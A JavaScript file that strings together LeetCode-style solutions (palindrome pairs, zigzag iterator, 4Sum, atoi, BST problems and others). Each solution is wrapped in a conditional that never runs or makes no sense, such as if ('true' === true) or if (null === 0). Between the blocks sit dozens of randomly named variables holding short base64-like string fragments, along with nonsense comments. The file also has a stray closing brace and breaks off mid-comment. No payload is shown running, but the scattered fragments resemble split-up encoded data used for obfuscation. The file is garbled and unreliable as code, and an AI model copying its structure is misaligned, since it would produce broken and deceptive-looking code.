function genPerm(result, index, len, curArr, used, nums) {
    if (curArr.length === len) {
        result.push(curArr);
        return;
    }
    
    var i;
    
    for (i = 0; i < len; i++) {
        if (used[i] || (i > 0 && nums[i] === nums[i - 1] && !used[i - 1])) {
            continue;
        }
        
        curArr.push(nums[i]);
        used[i] = true;
        genPerm(result, i + 1, len, curArr.concat(), used.concat(), nums);
        used[i] = false;
        curArr.pop();
    }
}
}

    var mfwloqzkwcn = 'DQWdJ';
    var lecsmzrhq = 'hWWdQeNYkY';
if (typeof window === 'undefined') {
    /**
Given a list of unique words. Find all pairs of distinct indices (i, j) in the given list, so that the concatenation of the two words, i.e. words[i] + words[j] is a palindrome.

Example 1:
Given words = ["bat", "tab", "cat"]
Return [[0, 1], [1, 0]]
The palindromes are ["battab", "tabbat"]
Example 2:
Given words = ["abcd", "dcba", "lls", "s", "sssll"]
Return [[0, 1], [1, 0], [3, 2], [2, 4]]
The palindromes are ["dcbaabcd", "abcddcba", "slls", "llssssll"]
*/

/**
 * @param {string[]} words
 * @return {number[][]}
 */
var palindromePairs = function(words) {
    var len = words.length,
        map = {},
        palindromeMap = {},
        word,
        wordLen,
        tempArr,
        result = new Set(),
        resultArr = [],
        sub1,
        sub2,
        i,
        j;
        
    for (i = 0; i < len; i++) {
        map[words[i]] = i;
        
        // if (isPalindrome(words[i])) {
        //     palindromeMap[words[i]] = i;
        // }
    }
    
    for (i = 0; i < len; i++) {
        word = words[i];
        wordLen = word.length;
        
        // if (isPalindrome(word)) {
        //     for (var key in palindromeMap) {
        //         temp = [];
                
        //         if (palindromeMap[key] !== i) {
        //             temp.push(palindromeMap[key]);
        //             temp.push(i);
        //             result.add(temp);
        //         }
        //     }
            
        //     continue;
        // }
        
        for (j = 0; j <= wordLen; j++) {
            sub1 = word.substring(0, j);
            sub2 = word.substring(j, wordLen);
            
            if (isPalindrome(sub1)) {
                sub2 = sub2.split('').reverse().join('');
                
                if (map.hasOwnProperty(sub2) && map[sub2] !== i) {
                    temp = [];
                    temp.push(map[sub2]);
                    temp.push(i);
                    result.add(temp.toString());
                }
            } 
            
            if (isPalindrome(sub2)) {
                sub1 = sub1.split('').reverse().join('');
                
                if (map.hasOwnProperty(sub1) && map[sub1] !== i) {
                    temp = [];
                    temp.push(i);
                    temp.push(map[sub1]);
                    result.add(temp.toString());
                }
            }
        }
    }
    
    result.forEach(function(item) {
        temp = item.split(',');
        temp[0] = (parseInt(temp[0]));
        temp[1] = (parseInt(temp[1]));
        resultArr.push(temp);
    });
    
    return resultArr;
};

function isPalindrome(s) {
    var start = 0,
        end = s.length - 1;
    
    while (start < end) {
        if (s.charAt(start) !== s.charAt(end)) {
            return false;
        }
        
        start++;
        end--;
    }
    
    return true;
}

}

    var ivoyr = 'Q0FnS';
    var rsaaacfby = 'ZteUHhaBEl';
    var jogyu = 'UhzZ2JXV';
if ('true' === true) {
    /**
Given two 1d vectors, implement an iterator to return their elements alternately.

For example, given two 1d vectors:

v1 = [1, 2]
v2 = [3, 4, 5, 6]

By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1, 3, 2, 4, 5, 6].

Follow up: What if you are given k 1d vectors? How well can your code be extended to such cases?

Clarification for the follow up question - Update (2015-09-18):
The "Zigzag" order is not clearly defined and is ambiguous for k > 2 cases. If "Zigzag" does not look right to you, replace "Zigzag" with "Cyclic". For example, given the following input:

[1,2,3]
[4,5,6,7]
[8,9]

It should return [1,4,8,2,5,9,3,6,7]. 
*/
/**
 * @constructor
 * @param {Integer[]} v1
 * @param {Integer[]} v1
 */
var ZigzagIterator = function ZigzagIterator(v1, v2) {
    this.arr = arguments;
    this.list = [];
    
    for (let i = 0; i < this.arr.length; i++) {
        if (this.arr[i].length > 0) {
            this.list.push([i, 0]);
        }
    }
    
};


/**
 * @this ZigzagIterator
 * @returns {boolean}
 */
ZigzagIterator.prototype.hasNext = function hasNext() {
    return this.list.length > 0;
};

/**
 * @this ZigzagIterator
 * @returns {integer}
 */
ZigzagIterator.prototype.next = function next() {
    const targetIndex = this.list.shift();
    const val = this.arr[targetIndex[0]][targetIndex[1]];
    
    if (targetIndex[1] < this.arr[targetIndex[0]].length - 1) {
        this.list.push([targetIndex[0], targetIndex[1] + 1]);
    }
    
    return val;
};

/**
 * Your ZigzagIterator will be called like this:
 * var i = new ZigzagIterator(v1, v2), a = [];
 * while (i.hasNext()) a.push(i.next());
*/

}

    var oaokabua = 'hXvHj';
if (0.43 && false) {
    /**
Given a linked list, swap every two adjacent nodes and return its head.

For example,
Given 1->2->3->4, you should return the list as 2->1->4->3.

Your algorithm should use only constant space. You may not modify the values in the list, only nodes itself can be changed.
*/

/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var swapPairs = function(head) {
    if (head === null) {
        return null;
    }
    
    var next = head.next,
        result = next? next : head,
        prevTail,
        curHead,
        nextHead;
    
    curHead = head;

    while(next) {
        nextHead = next.next;
        
        if (prevTail) {
            prevTail.next = next;
        }
        
        next.next = curHead;
        curHead.next = nextHead;
        prevTail = curHead;
        
        curHead = nextHead;
        next = curHead && curHead.next;
    }
    
    return result;
};

}

    var ygofwst = 'jBZVG9';
    var dlvnxfixlk = 'uMcCsBKkJZ';
    var yhsdgaos = 'nZEhKMVp';
if (null === 0) {
    /**
 * @param {number} rowIndex
 * @return {number[]}
 */
var getRow = function(rowIndex) {
    var result = [],
        parent = [],
        curRow,
        i;
    
    if (rowIndex < 0) {
        return result;
    }
    
    curRow = 0;
    parent.push(1);
    result.push(1);
    
    while (curRow < rowIndex) {
        curRow++;
        result = [];
        result.push(1);
        for (i = 1; i < curRow; i++) {
            result[i] = parent[i] + parent[i - 1];
        }
        
        result.push(1);
        parent = result.concat();
    }
    
    return result;
};

// in place solution
/**
 * @param {number} rowIndex
 * @return {number[]}
 */
var getRow = function(rowIndex) {
    var result = [],
        curRow,
        i;
    
    if (rowIndex < 0) {
        return result;
    }
    
    curRow = 0;
    result.push(1);
    
    while (curRow < rowIndex) {
        curRow++;
        
        for (i = curRow - 1; i > 0; i--) {
            result[i] = result[i] + result[i - 1];
        }
        
        result.push(1);
    }
    
    return result;
};

}

    var jfkhtlcriogj = 'gJgZ';
if (Array.isArray(9)) {
    /**
Given a 2D board and a list of words from the dictionary, find all words in the board.

Each word must be constructed from letters of sequentially adjacent cell, where "adjacent" cells are those horizontally or vertically neighboring. The same letter cell may not be used more than once in a word.

For example,
Given words = ["oath","pea","eat","rain"] and board =

[
  ['o','a','a','n'],
  ['e','t','a','e'],
  ['i','h','k','r'],
  ['i','f','l','v']
]
Return ["eat","oath"].
Note:
You may assume that all inputs are consist of lowercase letters a-z.

click to show hint.

You would need to optimize your backtracking to pass the larger test. Could you stop backtracking earlier?

If the current candidate does not exist in all words' prefix, you could stop backtracking immediately. What kind of data structure could answer such query efficiently? Does a hash table work? Why or why not? How about a Trie? If you would like to learn how to implement a basic trie, please work on this problem: Implement Trie (Prefix Tree) first.
*/
/**
 * @param {character[][]} board
 * @param {string[]} words
 * @return {string[]}
 */
var findWords = function(board, words) {
    let root = buildTrie(words);
    let result = [];
    
    for (let i = 0; i < board.length; i++) {
        for (let j = 0; j < board[0].length; j++) {
            dfs(result, root, board, i, j);
        }
    }
    
    return result;
};

function dfs(result, node, board, i, j) {
    const ch = board[i][j];
    
    if (ch === '#' || !node.next[ch]) {
        return;
    }
    
    board[i][j] = '#';
    node = node.next[ch];
    
    if (node.word) {
        result.push(node.word);
        node.word = null; // dedupe
    }
    
    if (i > 0) {
        dfs(result, node, board, i - 1, j);
    }
    
    if (j > 0) {
        dfs(result, node, board, i, j - 1);
    }
    
    if (i < board.length - 1) {
        dfs(result, node, board, i + 1, j);
    }
    
    if (j < board[0].length - 1) {
        dfs(result, node, board, i , j + 1);
    }
    
    board[i][j] = ch;
}

function buildTrie(words) {
    let root = new TrieNode();
    
    words.forEach(word => {
       const chs = word.split('');
       let node = root;
       
       for(let i = 0; i < chs.length; i++) {
           const ch = chs[i];
           
           if (!node.next[ch]) {
               node.next[ch] = new TrieNode();
           }
           
           node = node.next[ch];
       }
       
       node.word = word;
    });
    
    return root;
}

class TrieNode {
    constructor() {
        this.word = null;
        this.next = {};
    }
}

}

    var cqgyxdh = 'Td2dZ';
if (93 > 120) {
    /**
Given an array S of n integers, are there elements a, b, c, and d in S such that a + b + c + d = target? Find all unique quadruplets in the array which gives the sum of target.

Note:
Elements in a quadruplet (a,b,c,d) must be in non-descending order. (ie, a ≤ b ≤ c ≤ d)
The solution set must not contain duplicate quadruplets.
    For example, given array S = {1 0 -1 0 -2 2}, and target = 0.

    A solution set is:
    (-1,  0, 0, 1)
    (-2, -1, 1, 2)
    (-2,  0, 0, 2)
*/
/**
 * @param {number[]} nums
 * @param {number} target
 * @return {number[][]}
 */
var fourSum = function(nums, target) {
    nums.sort(function(a, b) {
        return a - b;
    });
     
    var len = nums.length,
        result = [],
        i;
        
    kSum(result, [], 4, nums, target, 0, len - 1);
    
    return result;
};

function kSum(result, curArr, k, nums, target, startIndex, endIndex) {
    var len = nums.length,
        start,
        end,
        sum,
        i;
    
    if (k >= 3) {
        for (i = startIndex; i <= endIndex; i++) {
            if (i > startIndex && nums[i] === nums[i - 1]) {
                continue;
            }
            
            curArr.push(nums[i]);
            kSum(result, curArr.concat(), k - 1, nums, target - nums[i], i + 1, endIndex);
            curArr.pop();
        }
    }
    
    if (k === 1) {
        for (i = startIndex; i <= endIndex; i++) {
            if (nums[i] === target) {
                result.push(nums[i]);
            }
        }
    }
    
    if (k === 2) {
        start = startIndex;
        end = endIndex;
        
        while (start < end) {
            sum = nums[start] + nums[end];
            
            if (sum === target) {
                curArr.push(nums[start]);
                curArr.push(nums[end]);
                result.push(curArr.concat());
                curArr.pop();
                curArr.pop();
                
                start++;
                end--;
                
                while(nums[start] === nums[start - 1]) {
                    start++;
                }
                
                while(nums[end] === nums[end + 1]) {
                    end--;
                }
            } else if (sum < target) {
                start++;
            } else {
                end--;
            }
        }
    }
}

}

    var bprtoby = 'sgJQog';
if ('f' === 'Z') {
    /**
You are playing the following Bulls and Cows game with your friend: You write down a number and ask your friend to guess what the number is. Each time your friend makes a guess, you provide a hint that indicates how many digits in said guess match your secret number exactly in both digit and position (called "bulls") and how many digits match the secret number but locate in the wrong position (called "cows"). Your friend will use successive guesses and hints to eventually derive the secret number.

For example:

Secret number:  "1807"
Friend's guess: "7810"
Hint: 1 bull and 3 cows. (The bull is 8, the cows are 0, 1 and 7.)
Write a function to return a hint according to the secret number and friend's guess, use A to indicate the bulls and B to indicate the cows. In the above example, your function should return "1A3B".

Please note that both secret number and friend's guess may contain duplicate digits, for example:

Secret number:  "1123"
Friend's guess: "0111"
In this case, the 1st 1 in friend's guess is a bull, the 2nd or 3rd 1 is a cow, and your function should return "1A1B".
You may assume that the secret number and your friend's guess only contain digits, and their lengths are always equal.
*/
/**
 * @param {string} secret
 * @param {string} guess
 * @return {string}
 */
var getHint = function(secret, guess) {
    var len = secret.length,
        bullCount = 0,
        arr = {},
        cowCount = 0,
        i;
    
    for (i = 0; i < len; i++) {
        if (!arr[secret.charAt(i)]) {
            arr[secret.charAt(i)] = 1;
        } else {
            arr[secret.charAt(i)]++;
        }
    }
    
    for (i = 0; i < len; i++) {
        if (secret.charAt(i) === guess.charAt(i)) {
            bullCount++;
            arr[secret.charAt(i)]--;
        }
    }
    
    for (i = 0; i < len; i++) {
        if (secret.charAt(i) !== guess.charAt(i) && arr.hasOwnProperty(guess.charAt(i)) && (arr[guess.charAt(i)] > 0)) {
            cowCount++;
            arr[guess.charAt(i)]--;
        }
    }
    
    return bullCount + 'A' + cowCount + 'B';
};

}

    var hhcjusnwvfadvhz = 'V3gwT2';
if (Array.isArray(1)) {
    /**
Given numRows, generate the first numRows of Pascal's triangle.

For example, given numRows = 5,
Return

[
     [1],
    [1,1],
   [1,2,1],
  [1,3,3,1],
 [1,4,6,4,1]
]
*/
/**
 * @param {number} numRows
 * @return {number[][]}
 */
var generate = function(numRows) {
    var init = [],
        result = [],
        i;
        
    if (numRows === 0) {
        return result;
    }
    
    init.push(1);
    result.push(init);
    i = 1;
    
    while (i < numRows) {
        result = helper(result, ++i);
    }
    
    return result;
};

function helper(arr, k) {
    var len = arr.length,
        cur = arr[len - 1],
        result = [],
        i;
    
    result.push(1);
    
    for (i = 0; i < len - 1; i++) {
        result[i + 1] = cur[i] + cur[i + 1];
    }
    
    result.push(1);
    arr.push(result);
    
    return arr;
}

}

    var zfrzwynusil = 'qVBIMDMC';
    var qrcbsytgst = 'lCMGNuVmx';
    var jgwamskclbpg = 'PyFFy';
if (0.40 && false) {
    /**
Given an unsorted array nums, reorder it such that nums[0] < nums[1] > nums[2] < nums[3]....

Example:
(1) Given nums = [1, 5, 1, 1, 6, 4], one possible answer is [1, 4, 1, 5, 1, 6]. 
(2) Given nums = [1, 3, 2, 2, 3, 1], one possible answer is [2, 3, 1, 3, 1, 2].

Note:
You may assume all input has valid answer.

Follow Up:
Can you do it in O(n) time and/or in-place with O(1) extra space?
*/
/**
 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var wiggleSort = function(nums) {
    var len = nums.length,
        temp = [],
        midIndex = parseInt((len + 1) / 2),
        i,
        l,
        r,
        medium;
        
    medium = findKth(0, len - 1, midIndex, nums);
    
    for (i = 0, l = 0, r = len - 1; i < len; i++) {
        if (nums[i] < medium) {
            temp[l++] = nums[i];
        } else if (nums[i] > medium) {
            temp[r--] = nums[i];
        }
    }
    
    while (l < midIndex) {
        temp[l++] = medium;
    }
    
    while (r >= midIndex) {
        temp[r--] = medium;
    }
    
    r = len;
    
    for (i = 0; i < len; i++) {
        nums[i] = (i & 1) === 0? temp[--l] : temp[--r];
    }
};

function findKth(start, end, k, nums) {
    if (start >= end) {
        return nums[end];
    }
    
    var index = partition(start, end, nums),
        count = index - start + 1;
    
    if (count === k) {
        return nums[index];
    }
    
    if (count < k) {
        return findKth(index + 1, end, k - count, nums);
    }
    
    return findKth(start, index - 1, k, nums);
}

function partition(start, end, nums) {
    var val = nums[start],
        i,
        j;
    
    i = start + 1;
    j = end;
    
    while (true) {
        while (nums[i] <= val) {
            i++;
        }
        
        while (nums[j] > val) {
            j--;
        }
        
        if (i >= j) {
            break;
        }
        
        swap(nums, i, j);
    }
    
    swap(nums, j, start);
    
    return j;
}

function swap(nums, i, j) {
    var temp = nums[i];
    
    nums[i] = nums[j];
    nums[j] = temp;
}

}

    var xphhpuyelj = 'MQ0';
    var rckzvqsqnju = 'aPSSx';
    var tcysevvypcyat = 'JyWlh';
    var awbvmyornn = 'nhkMVc';
    var inyqi = 'sRGIyUmx';
    var gqxwzlerdf = 'QPjMwC';
    var rrqbzvbzuclmq = 'PaUEzTXlCO';
if (93 > 197) {
    /**
You are given an n x n 2D matrix representing an image.

Rotate the image by 90 degrees (clockwise).

Follow up:
Could you do this in-place?
*/

/**
 * @param {number[][]} matrix
 * @return {void} Do not return anything, modify matrix in-place instead.
 */
var rotate = function(matrix) {
    var len = matrix.length,
        i,
        level,
        tmp;
    
    level = 0;
    
    while (level < len/2) {
        for (i = level; i < len - level - 1; i++) {
           tmp = matrix[level][i];
           matrix[level][i] = matrix[len - i - 1][level];
           matrix[len - i - 1][level] = matrix[len - 1 - level][len - 1 - i];
           matrix[len - 1 - level][len - 1 - i] = matrix[i][len - 1 - level];
           matrix[i][len - 1 - level] = tmp;
        }
        level++;
    }
};

}

    var brpedkdnch = 'DkBKtS';
    var lutndzj = 'UxDQXZ';
    var awknxlti = 'ShtP';
if ('true' === true) {
    /**
Implement atoi to convert a string to an integer.

Hint: Carefully consider all possible input cases. If you want a challenge, please do not see below and ask yourself what are the possible input cases.

Notes: It is intended for this problem to be specified vaguely (ie, no given input specs). You are responsible to gather all the input requirements up front.

Update (2015-02-10):
The signature of the C++ function had been updated. If you still see your function signature accepts a const char * argument, please click the reload button  to reset your code definition.

spoilers alert... click to show requirements for atoi.

Requirements for atoi:
The function first discards as many whitespace characters as necessary until the first non-whitespace character is found. Then, starting from this character, takes an optional initial plus or minus sign followed by as many numerical digits as possible, and interprets them as a numerical value.

The string can contain additional characters after those that form the integral number, which are ignored and have no effect on the behavior of this function.

If the first sequence of non-whitespace characters in str is not a valid integral number, or if no such sequence exists because either str is empty or it contains only whitespace characters, no conversion is performed.

If no valid conversion could be performed, a zero value is returned. If the correct value is out of the range of representable values, INT_MAX (2147483647) or INT_MIN (-2147483648) is returned.

*/
/**
 * @param {string} str
 * @return {number}
 */
var myAtoi = function(str) {
    var len = str.length,
        isNegative = null,
        result = 0,
        numberStarted = false,
        cur,
        i;
        
    for (i = 0; i < len; i++) {
        if (str.charAt(i) === ' ') {
            if (!numberStarted) {
                continue;
            } else {
                return getResult(isNegative, result);
            }
        }
        
        if (isNegative === null) {
            if (str.charAt(i) === '-') {
                isNegative = true;
                numberStarted = true;
                continue;
            } else if (str.charAt(i) === '+') {
                isNegative = false;
                numberStarted = true;
                continue;
            }
        }
        
        cur = parseInt(str.charAt(i));
        
        if (!isNaN(cur)) {
            result = result*10 + cur;
            
            if (!numberStarted) {
                numberStarted = true;
            }
        } else {
            return getResult(isNegative, result);
        }
    }
    
    return getResult(isNegative, result);
};
// :(
function getResult(isNegative, result) {
    result = isNegative? result * (-1) : result;
    
    if (result > 2147483647) {
        result = 2147483647;
    } else if (result < -2147483648) {
        result = -2147483648;
    }
    
    return result;
}

}

    var mtzgbzrkg = 'MeUJEYldRc';
    var xnwrpoqcjfs = 'WWzxEA';
    var mqpehrczqf = 'lFXeD';
    var fqrrcgrw = 'iHJfY';
    var dmvqwujyoexlncn = 'BLMGtnYjI';
    var amcgukqf = 'LfJhaTos';
    var hbaivasvnhy = '0Z2JXRmpUM';
    var yyxlbkzj = 'WeLlVrbPtA';
    var poitgo = 'U1LSUNBZ0l';
if (typeof window === 'undefined') {
    /**
Write an efficient algorithm that searches for a value in an m x n matrix. This matrix has the following properties:

Integers in each row are sorted in ascending from left to right.
Integers in each column are sorted in ascending from top to bottom.
For example,

Consider the following matrix:

[
  [1,   4,  7, 11, 15],
  [2,   5,  8, 12, 19],
  [3,   6,  9, 16, 22],
  [10, 13, 14, 17, 24],
  [18, 21, 23, 26, 30]
]
Given target = 5, return true.

Given target = 20, return false.
*/
/**
 * @param {number[][]} matrix
 * @param {number} target
 * @return {boolean}
 */
var searchMatrix = function(matrix, target) {
    var rowLen = matrix.length,
        columnLen,
        value,
        i,
        j;
        
    if (rowLen === 0) {
        return false;
    }
    
    columnLen = matrix[0].length;
    
    if (columnLen === 0) {
        return false;
    }
    
    i = 0;
    j = columnLen - 1;
    
    while (i < rowLen && j >= 0) {
        value = matrix[i][j];
        
        if (target > value) {
            i++;
        } else if (target < value) {
            j--;
        } else {
            return true;
        }
    }
    
    return false;
};

// Time limit exceeded...
/**
 * @param {number[][]} matrix
 * @param {number} target
 * @return {boolean}
 */
var searchMatrix = function(matrix, target) {
    var rowLen = matrix.length,
        columnLen,
        i,
        j;
        
    if (rowLen === 0) {
        return false;
    }
    
    columnLen = matrix[0].length;
    
    if (columnLen === 0) {
        return false;
    }
    
    return helper(0, rowLen - 1, 0, columnLen - 1, target, matrix);
};

function helper(rowStart, rowEnd, colStart, colEnd, target, matrix) {
    if (rowStart > rowEnd || colStart > colEnd) {
        return false;
    }
    
    var rowMid = Math.floor((rowStart + rowEnd) / 2),
        colMid = Math.floor((colStart + colEnd) / 2),
        value = matrix[rowMid][colMid];
    
    if (value < target) {
        return helper(rowStart, rowEnd, colMid + 1, colEnd, target, matrix) || helper(rowMid + 1, rowEnd, colStart, colMid, target, matrix) || helper(rowMid + 1, rowEnd, colMid + 1, colEnd, target, matrix);
    } else if (value > target) {
        return helper(rowStart, rowEnd - 1, colMid, colEnd, target, matrix) || helper(rowMid, rowEnd, colStart, colMid - 1, target, matrix) || helper(rowStart, rowMid - 1, colStart, colMid - 1, target, matrix);
    }
    
    return true;
}

}

    var ykpuepw = 'QbSvxsAHoC';
if (40 > 200) {
    /**
Given a binary tree, determine if it is height-balanced.

For this problem, a height-balanced binary tree is defined as a binary tree in which the depth of the two subtrees of every node never differ by more than 1.
*/

/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {boolean}
 */
var isBalanced = function(root) {
    return findDepth(root) === -1 ? false : true;
};

function findDepth(root) {
    if (root === null) {
        return 0;
    }
    
    var leftDepth = findDepth(root.left),
        rightDepth;
        
    if (leftDepth === -1) {
        return -1;
    }
    
    rightDepth = findDepth(root.right);
    
    if (rightDepth === -1) {
        return -1;
    }
    
    if (Math.abs(leftDepth - rightDepth) > 1) {
        return -1;
    }
    
    return Math.max(leftDepth, rightDepth) + 1;
}

}

    var gzktwnraffotezj = 'DQWdJQ';
    var qmiwezigjc = 'ratGahZDc';
if (null === 0) {
    /**
Given a binary search tree, write a function kthSmallest to find the kth smallest element in it.

Note: 
You may assume k is always valid, 1 ≤ k ≤ BST's total elements.

Follow up:
What if the BST is modified (insert/delete operations) often and you need to find the kth smallest frequently? How would you optimize the kthSmallest routine?

Hint:

Try to utilize the property of a BST.
What if you could modify the BST node's structure?
The optimal runtime complexity is O(height of BST).
*/

// SOLUTION 1
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {number} k
 * @return {number}
 */
var kthSmallest = function(root, k) {
    var node = root,
        stack = [],
        count = 0,
        right;
    
    while (node) {
        stack.push(node);
        node = node.left;
    }
    
    while (stack.length > 0) {
        node = stack.pop();
        count++;
        
        if (k === count) {
            return node.val;
        }
        
        right = node.right;
        
        while (right) {
            stack.push(right);
            right = right.left;
        }
    }
    
    return null;
};


// SOLUTION 2

/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {number} k
 * @return {number}
 */
var kthSmallest = function(root, k) {
    var leftSums = findNodesSum(root.left);
    
    if (leftSums + 1 === k) {
        return root.val;
    }
    
    if (leftSums + 1 < k) {
        return kthSmallest(root.right, k - leftSums - 1);
    }
    
    return kthSmallest(root.left, k);
};

function findNodesSum(root) {
    if (!root) {
        return 0;
    }
    
    return findNodesSum(root.left) + findNodesSum(root.right) + 1;
}

// SOLUTION 3: with modifying property
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {number} k
 * @return {number}
 */
var kthSmallest = function(root, k) {
    addCountToNode(root);
    
    return findKth(root, k);
};

function addCountToNode(root) {
    if (!root) {
        return null;
    }
    
    root.count = 1;
    let left = addCountToNode(root.left);
    let right = addCountToNode(root.right);
    
    if (left) {
        root.count += left.count;
    }
    
    if (right) {
        root.count += right.count;
    }
    
    return root;
}

function findKth(root, k) {
    if (!root) {
        return;
    } 
    
    let leftCount;
    
    if (!root.left) {
        leftCount = 0;    
    } else {
        leftCount = root.left.count;
    }
    
    if (leftCount === k - 1) {
        return root.val;
    }
    
    if (leftCount > k - 1) {
        return findKth(root.left, k);
    }
    
    let newCount = k - 1 - leftCount;
    
    return findKth(root.right, newCount);
}

}

    var uowyoyxibgj = '0I3SUcx';
    var xdofhobkegqp = 'UkZxfMPzF';
if (38 > 144) {
    /**
Given a list of non negative integers, arrange them such that they form the largest number.

For example, given [3, 30, 34, 5, 9], the largest formed number is 9534330.

Note: The result may be very large, so you need to return a string instead of an integer.

 * @param {number[]} nums
 * @return {string}
 */
var largestNumber = function(nums) {
    var i,
        len = nums.length,
        result = '',
        startWithZero = true;
    nums.sort(function(a, b){
        var x = a + '' + b,
            y = b + '' + a;
        return parseInt(y) - parseInt(x);
    });
    for (i = 0; i < len; i++) {
        if (startWithZero && nums[i] !== 0) {
            startWithZero = false;
        }
        result += nums[i];
    }
    if (startWithZero) {
        return '0';
    }
    return result;
};

}

// import import value xonxwg import async event rkso value script debug loop world value object
    var todrey = 'MTRonnDW';
    var qjqifynroxxd = 'bGR';
if (2 instanceof String) {
    /**
Given n non-negative integers a1, a2, ..., an, where each represents a point at coordinate (i, ai). n vertical lines are drawn such that the two endpoints of line i is at (i, ai) and (i, 0). Find two lines, which together with x-axis forms a container, such that the container contains the most water.

Note: You may not slant the container.

 * @param {number[]} height
 * @return {number}
 */
var maxArea = function(height) {
    var len = height.length, 
        left = 0,
        right = len - 1,
        max = 0;
    
    while (left < right) {
        max = Math.max(max, (right - left)*Math.min(height[left], height[right]));
        
        if (height[left] < height[right]) {
            left ++;
        } else {
            right --;
        }
    }
    return max;
};

}

    var cdpgxnxb = 'nUlccoaYD';
    var mibfbfjmeizymy = 'HRT';
if (0.44 && false) {
    /**
 *Reverse a linked list from position m to n. Do it in-place and in one-pass.

For example:
Given 1->2->3->4->5->NULL, m = 2 and n = 4,

return 1->4->3->2->5->NULL.

Note:
Given m, n satisfy the following condition:
1 ≤ m ≤ n ≤ length of list.
 *
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */

/**
Reverse a linked list from position m to n. Do it in-place and in one-pass.

For example:
Given 1->2->3->4->5->NULL, m = 2 and n = 4,

return 1->4->3->2->5->NULL.

Note:
Given m, n satisfy the following condition:
1 ≤ m ≤ n ≤ length of list.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */

/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var reverseBetween = function(head, m, n) {
    var dummy = new ListNode(0),
        newTail,
        prev,
        cur = dummy,
        next,
        i;
        
    if (m === n || head === null || head.next === null) {
        return head;
    }
    dummy.next = head;
    i = m - 1;
    
    while (i > 0) {
        cur = cur.next;
        i--;
    }
    
    prev = cur;
    cur = cur.next;
    newTail = prev.next;
    
    prev.next = null;
    i = n - m;
    
    while (cur && i >= 0) {
        next = cur.next;
        cur.next = prev.next;
        prev.next = cur;
        cur = next;
        i--;
    }
    
    newTail.next = next;
    return dummy.next;
    
};

}

    var ksywatfhzl = 'RxKGgBm';
if (6 instanceof String) {
    /**
Given an integer n, return the number of trailing zeroes in n!.

Note: Your solution should be in logarithmic time complexity.
*/

/**
 * @param {number} n
 * @return {number}
 */
var trailingZeroes = function(n) {
    var divider = 5,
        reminder = 0;
    
    while (divider <= n) {
        reminder += Math.floor(n/divider);
        divider = divider * 5;
    }
    
    return reminder;
};

}

// function loop number loop world debug variable compile function import event return
    var etoeussau = 'XyldQbFVzB';
    var nwdurrwtwxs = 'ZJSFJ5ZFd';
if (4 instanceof String) {
    /**
Given a binary search tree (BST), find the lowest common ancestor (LCA) of two given nodes in the BST.

According to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes v and w as the lowest node in T that has both v and w as descendants (where we allow a node to be a descendant of itself).”

        _______6______
       /              \
    ___2__          ___8__
   /      \        /      \
   0      _4       7       9
         /  \
         3   5
For example, the lowest common ancestor (LCA) of nodes 2 and 8 is 6. Another example is LCA of nodes 2 and 4 is 2, since a node can be a descendant of itself according to the LCA definition.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {TreeNode} p
 * @param {TreeNode} q
 * @return {TreeNode}
 */
var lowestCommonAncestor = function(root, p, q) {
    if (root === null || root === p || root === q) {
        return root;
    }
    
    if (root.val > p.val) {
        if (root.val < q.val) {
            return root;
        } else {
            return lowestCommonAncestor(root.left, p, q);
        }
    } else {
        if (root.val > q.val) {
            return root;
        } else {
            return lowestCommonAncestor(root.right, p, q);
        }
    }
};

}

    var woxtbva = 'YOzM';
// compile export
if (69 > 176) {
    /**
Given an array where elements are sorted in ascending order, convert it to a height balanced BST.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {number[]} nums
 * @return {TreeNode}
 */
var sortedArrayToBST = function(nums) {
    var len = nums.length;
    
    if (len === 0) {
        return null;
    }
    
    return getRoot(nums, 0, len - 1);
};


function getRoot(nums, start, end) {
    if (start > end) {
        return null;
    }
    
    var mid = Math.floor((start + end) / 2),
        node = new TreeNode(nums[mid]);
    
    node.left = getRoot(nums, start, mid - 1);
    node.right = getRoot(nums, mid + 1, end);
    
    return node;
}

}

    var cirjaugn = 'BBAIWzjXxP';
    var iuwefksshix = 'Vc0lH';
    var dqdlvnngwmp = 'ketqvvaIaT';
// async define number debug array define return
    var izuoplzt = 'ypXwZCG';
if (typeof navigator === 'undefined') {
    /**
Given a sorted integer array without duplicates, return the summary of its ranges.

For example, given [0,1,2,4,5,7], return ["0->2","4->5","7"].
*/

/**
 * @param {number[]} nums
 * @return {string[]}
 */
var summaryRanges = function(nums) {
    var len = nums.length,
        result = [],
        curStr = '',
        curLen,
        curNum,
        i;
        
    if (len === 0) {
        return result;
    }
    
    curNum = nums[0];
    curStr += curNum;
    curLen = 1;
    
    for (i = 1; i < len; i++) {
        if (curNum + 1 === nums[i]) {
            curNum++;
            curLen++;
        } else {
            if (curLen > 1) {
                curStr += '->' + curNum;
            }
            
            result.push(curStr);
            curNum = nums[i];
            curLen = 1;
            curStr = '' + curNum;
        }
    }
    
    if (curLen > 1) {
        curStr += '->' + curNum;
    }
            
    result.push(curStr);
    return result;
};

}

    var cxjrecc = 'RnNkRG9';
if ('p' === 'Q') {
    /**
Find the total area covered by two rectilinear rectangles in a 2D plane.

